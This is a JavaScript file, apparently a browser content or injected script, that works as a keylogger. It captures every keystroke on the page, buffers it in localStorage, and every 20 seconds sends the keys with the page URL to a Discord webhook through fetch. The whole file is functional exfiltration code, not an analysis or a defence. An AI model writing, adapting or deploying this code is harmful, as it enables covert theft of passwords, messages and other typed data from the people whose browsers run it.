let keys = "";
const current = document.URL;
document.addEventListener("keydown", (event) => {
  const key = event.key;
  if (key === "Enter") {
    keys += "\n";
    return;
  }
  if (key === "Backspace") {
    keys = keys.slice(0, keys.length - 1);
    return;
  }
  if (key === "CapsLock" || key === "Shift") {
    return;
  }
  if (key === "Control") {
    keys += "[Ctrl]";
    return;
  }
  // Arrows
  if (key === "ArrowLeft") {
    keys += "[LeftArrow]";
    return;
  }
  if (key === "ArrowRight") {
    keys += "[RightArrow]";
    return;
  }
  if (key === "ArrowDown") {
    keys += "[DownArrow]";
    return;
  }
  if (key === "ArrowUp") {
    keys += "[UpArrow]";
    return;
  }
  // End arrows
  keys += key;
  saveKeysLocal();
});

window.setInterval(async () => {
  keys = getKeysLocal();
  if (keys == "") {
    return;
  }
  const message = `<${current}>\nHere are the keys: ` + "```" + keys + "```";
  sendMessageToDiscord(discordWebhook, message);
  keys = "";
  saveKeysLocal();
}, 20000); // time in milliseconds

async function sendMessageToDiscord(webhook, msg) {
  await fetch(webhook, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      content: msg,
    }),
  });
}

function saveKeysLocal() {
  localStorage.setItem("keys", keys);
}

function getKeysLocal() {
  return localStorage.getItem("keys");
}
